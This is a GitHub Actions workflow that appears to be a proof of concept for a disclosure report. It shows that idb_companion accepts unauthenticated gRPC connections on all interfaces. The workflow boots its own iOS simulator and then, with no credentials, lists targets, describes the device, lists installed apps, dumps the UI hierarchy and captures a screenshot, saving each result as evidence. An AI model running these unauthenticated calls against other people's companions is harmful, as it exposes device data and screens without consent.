name: idb-companion-unauth-poc

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  poc:
    runs-on: macos-15
    timeout-minutes: 30
    steps:
      - name: System info
        run: |
          sw_vers
          xcrun --version
          xcrun simctl list runtimes | head -20

      - name: Set up Python 3.11
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install fb-idb python client
        run: |
          python3 -m venv /Users/runner/idb-venv
          /Users/runner/idb-venv/bin/pip install --quiet fb-idb
          /Users/runner/idb-venv/bin/idb --help | head -10 || true

      - name: Install idb-companion via brew
        run: |
          brew tap facebook/fb
          brew install idb-companion
          which idb_companion

      - name: Show vulnerable code references (static evidence)
        run: |
          git clone --depth 1 https://github.com/facebook/idb.git /tmp/idb-src
          cd /tmp/idb-src
          mkdir -p /Users/runner/evidence
          OUT=/Users/runner/evidence/evidence-static.txt
          {
            echo "=== HEAD ==="
            git log --oneline -1
            echo ""
            echo "=== BIND ADDRESS (IDBPortsConfiguration.swift) ==="
            grep -n '\.hostAndPort\|grpcDomainSocket\|grpcPort\|tlsCertPath' idb_companion/Configuration/IDBPortsConfiguration.swift
            echo ""
            echo "=== INTERCEPTORS (no auth interceptor present) ==="
            ls idb_companion/SwiftServer/Interceptors/
            echo ""
            echo "=== CompanionServiceInterceptors.swift (what does it do?) ==="
            head -80 idb_companion/SwiftServer/Interceptors/CompanionServiceInterceptors.swift
            echo ""
            echo "=== 45 RPC methods exposed (proto/idb.proto) ==="
            grep -c '^  rpc ' proto/idb.proto
            grep '^  rpc ' proto/idb.proto
          } > "$OUT"
          cat "$OUT" | head -80

      - name: Create + boot iOS Simulator, run companion, run UNAUTH client (single step so companion stays alive)
        run: |
          set -e
          mkdir -p /Users/runner/evidence
          # Pick newest iOS runtime + a supported iPhone device type
          PAIR=$(xcrun simctl list runtimes -j | python3 -c "
          import json,sys
          d=json.load(sys.stdin)
          rts=[r for r in d['runtimes'] if r['isAvailable'] and 'iOS' in r['name']]
          rts.sort(key=lambda r: r['version'], reverse=True)
          r=rts[0]
          dts=[d for d in r.get('supportedDeviceTypes', []) if 'iPhone' in d.get('name','')]
          if not dts:
              dts=r['supportedDeviceTypes']
          print(r['identifier'] + '|' + dts[-1]['identifier'])
          ")
          RUNTIME=${PAIR%%|*}
          DEVICE_TYPE=${PAIR##*|}
          echo "Runtime: $RUNTIME   Device: $DEVICE_TYPE"
          UDID=$(xcrun simctl create "PoC-iPhone" "$DEVICE_TYPE" "$RUNTIME")
          echo "UDID=$UDID"
          echo "$UDID" > /Users/runner/evidence/sim-udid.txt
          xcrun simctl boot "$UDID"
          xcrun simctl bootstatus "$UDID" -b

          # Start companion in background — disown so step end doesn't kill it
          nohup idb_companion --udid "$UDID" \
            > /Users/runner/evidence/companion-stdout.log \
            2> /Users/runner/evidence/companion-stderr.log &
          COMPANION_PID=$!
          disown
          echo "Companion PID: $COMPANION_PID"
          sleep 8

          # PROOF 1 — verify bind
          {
            echo "=== ps companion ==="
            ps -p "$COMPANION_PID" -o pid,ppid,stat,command || echo "companion not running!"
            echo ""
            echo "=== netstat -an | grep 10882 ==="
            netstat -an | grep 10882 || echo "(no listener? trying lsof)"
            echo ""
            echo "=== lsof -nP -iTCP:10882 ==="
            lsof -nP -iTCP:10882 || true
            echo ""
            echo "=== EXPECTED ==="
            echo "Bind to *.10882 or [::].10882  =>  EXPOSED on all interfaces (the bug)"
            echo "Bind to 127.0.0.1.10882        =>  localhost-only (would be secure)"
          } | tee /Users/runner/evidence/evidence-bind.txt

          # PROOF 2 — unauth list-targets from 127.0.0.1
          {
            echo "=== IDB_COMPANION=127.0.0.1:10882 idb list-targets (NO AUTH, NO TLS) ==="
            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb list-targets 2>&1
          } | tee /Users/runner/evidence/evidence-unauth-list.txt

          # PROOF 2-BIS — connect from NON-LOOPBACK runner IP (proves network-reachable, not just localhost)
          RUNNER_IP=$(ifconfig | awk '/inet / && $2 != "127.0.0.1" {print $2; exit}')
          {
            echo "=== Runner non-loopback IP: $RUNNER_IP ==="
            echo "=== netstat -an confirming bind on all interfaces ==="
            netstat -an -p tcp | grep 10882 || true
            echo ""
            echo "=== IDB_COMPANION=$RUNNER_IP:10882 idb list-targets ==="
            IDB_COMPANION=$RUNNER_IP:10882 /Users/runner/idb-venv/bin/idb list-targets 2>&1 | head -10
            echo ""
            echo "If the above returned targets, the daemon IS reachable from non-loopback addresses"
            echo "= confirmed: bind is NOT localhost-only, it accepts connections from any interface"
          } | tee /Users/runner/evidence/evidence-network-reachable.txt

          # PROOF 3 — describe (target metadata exfil)
          {
            echo "=== IDB_COMPANION=127.0.0.1:10882 idb describe --udid $UDID ==="
            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb describe --udid "$UDID" 2>&1
          } | tee /Users/runner/evidence/evidence-unauth-describe.txt

          # PROOF 4 — list-apps (data exposure)
          {
            echo "=== IDB_COMPANION=127.0.0.1:10882 idb list-apps --udid $UDID ==="
            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb list-apps --udid "$UDID" 2>&1 | head -40
          } | tee /Users/runner/evidence/evidence-unauth-listapps.txt

          # PROOF 5 — accessibility UI hierarchy (full screen state disclosure)
          {
            echo "=== IDB_COMPANION=127.0.0.1:10882 idb ui describe-all ==="
            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb ui describe-all --udid "$UDID" 2>&1 | head -80
          } | tee /Users/runner/evidence/evidence-unauth-ui.txt

          # PROOF 6 — screenshot capture from outside
          {
            echo "=== idb screenshot ==="
            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb screenshot --udid "$UDID" /Users/runner/evidence/screenshot-exfiltrated.png 2>&1
            ls -la /Users/runner/evidence/screenshot-exfiltrated.png 2>&1 || true
            file /Users/runner/evidence/screenshot-exfiltrated.png 2>&1 || true
          } | tee /Users/runner/evidence/evidence-unauth-screenshot.txt

          # Final state of companion
          {
            echo "=== companion stdout ==="
            cat /Users/runner/evidence/companion-stdout.log || true
            echo ""
            echo "=== companion stderr (final) ==="
            cat /Users/runner/evidence/companion-stderr.log | head -40 || true
          } > /Users/runner/evidence/evidence-companion-final.log

          # Stop the companion cleanly
          kill "$COMPANION_PID" 2>/dev/null || true

      - name: Upload evidence artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: idb-unauth-poc-evidence
          path: |
            /Users/runner/evidence/
